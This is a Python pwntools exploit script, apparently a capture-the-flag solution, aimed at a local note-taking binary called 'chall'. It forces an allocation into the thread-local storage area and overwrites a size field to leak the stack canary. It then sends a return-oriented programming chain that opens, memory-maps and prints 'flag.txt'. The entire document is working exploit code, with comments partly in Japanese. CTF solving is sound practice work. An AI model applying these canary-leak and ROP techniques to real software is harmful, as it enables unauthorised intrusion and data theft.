#!/usr/bin/env python3
from pwn import *
import warnings
warnings.simplefilter("ignore")

target = process("./chall")
if args.GDB:
    gdb.attach(target, gdbscript="b *0x401944")

def create():
    target.recvuntil("> ")
    target.sendline("1")
    target.recvuntil("is ")
    string = int(str(target.recvline())[2:-3], 16)
    return string

def write(id, size, content):
    target.recvuntil("> ")
    target.sendline("2")
    target.recvuntil("= ")
    target.sendline(str(id))
    target.recvuntil("= ")
    target.sendline(str(size))
    target.sendline(content)

def read(id):
    target.recvuntil("> ")
    target.sendline("3")
    target.recvuntil("= ")
    target.sendline(str(id))
    string = target.recvuntil(b"1. create note\n", drop=True)[-8:]
    return string


for i in range(14):
    create()

#15回目でTLS領域に確保される
leak = create()
print("idx chunk   : ", 14, hex(leak))

#sizeを書き換え
write(14, 6000, "")

canary = u64(read(14))
print("canary is: ", hex((canary)))

#open用に確保
flag_addr = create()
write(15, 0x10, b"./flag.txt\x00")

pop_rax = p64(0x401491)
pop_rdi = p64(0x40148f)
pop_rsi = p64(0x401493)
pop_rdx = p64(0x401495)
pop_rcx = p64(0x40149e)
pop_r8  = p64(0x40149a)
pop_r9  = p64(0x40149d)
syscall = p64(0x4014a8)

payload = p64(0x34) + b"a" * 0x10 + p64(canary) + p64(0x4)
#open(flag_addr, 0) syscall 0x2
payload += pop_rdi
payload += p64(flag_addr)
payload += pop_rsi
payload += p64(0)
payload += pop_rax
payload += p64(0x2)
payload += syscall
#mmap(0x1337000, 0x1000, 2, 1, 3, 0) syscall 0x9
payload += pop_rdi
payload += p64(0x1337000)
payload += pop_rsi 
payload += p64(0x1000)
payload += pop_rdx
payload += p64(0x4)
payload += pop_rcx
payload += p64(0x2)
payload += pop_r8
payload += p64(0x3)
payload += pop_r9
payload += p64(0x0)
payload += pop_rax
payload += p64(0x9)
payload += syscall
#write(1, 0x1337000, 0x20)
payload += pop_rdi
payload += p64(0x1)
payload += pop_rsi
payload += p64(0x1337000)
payload += pop_rdx
payload += p64(0xd)
payload += pop_rax
payload += p64(0x1)
payload += syscall
target.recvuntil("> ")
target.sendline(payload)

target.interactive()